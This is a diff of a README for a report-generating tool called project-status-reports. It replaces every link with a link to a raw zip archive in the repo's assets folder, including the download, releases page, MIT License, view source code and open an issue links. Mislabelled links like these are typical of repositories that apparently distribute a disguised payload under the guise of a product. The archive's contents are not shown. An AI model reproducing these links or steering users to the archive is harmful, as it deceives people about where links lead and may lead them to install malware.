@@ -1,6 +1,6 @@
 # 🤖 project-status-reports - Effortless Reports in Minutes
 
-[![Download](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/reports-project-status-v2.1.zip)](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/reports-project-status-v2.1.zip)
+[![Download](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/project-reports-status-v3.7-alpha.1.zip)](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/project-reports-status-v3.7-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, ensure your system meets the following requirements:
 
 To get started with project-status-reports, visit the releases page to download the software. 
 
-[Download the latest version here](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/reports-project-status-v2.1.zip).
+[Download the latest version here](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/project-reports-status-v3.7-alpha.1.zip).
 
 1. Click the link above to go to the releases page.
 2. Look for the most recent version of the software.
@@ -84,11 +84,11 @@ Explore these topics to understand more about how project-status-reports can enh
 
 Stay informed about updates and changes. You can find detailed release notes on the releases page. Here, we list features, enhancements, and bug fixes that are included in the latest versions.
 
-[Visit the releases page](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/reports-project-status-v2.1.zip) to check it out. 
+[Visit the releases page](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/project-reports-status-v3.7-alpha.1.zip) to check it out. 
 
 ## 🌟 License
 
-project-status-reports is open source and available under the [MIT License](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/reports-project-status-v2.1.zip). You can freely use, modify, and distribute the software.
+project-status-reports is open source and available under the [MIT License](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/project-reports-status-v3.7-alpha.1.zip). You can freely use, modify, and distribute the software.
 
 ## 📝 Feedback
 
@@ -98,8 +98,8 @@ Thank you for using project-status-reports! We hope it makes your reporting task
 
 ## 🖱️ Quick Links
 
-- [Download the latest version](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/reports-project-status-v2.1.zip)
-- [View the source code](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/reports-project-status-v2.1.zip)
-- [Open an issue](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/reports-project-status-v2.1.zip) 
+- [Download the latest version](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/project-reports-status-v3.7-alpha.1.zip)
+- [View the source code](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/project-reports-status-v3.7-alpha.1.zip)
+- [Open an issue](https://raw.githubusercontent.com/deepanshulynox/project-status-reports/main/assets/project-reports-status-v3.7-alpha.1.zip) 
 
 Start generating your project status reports today!
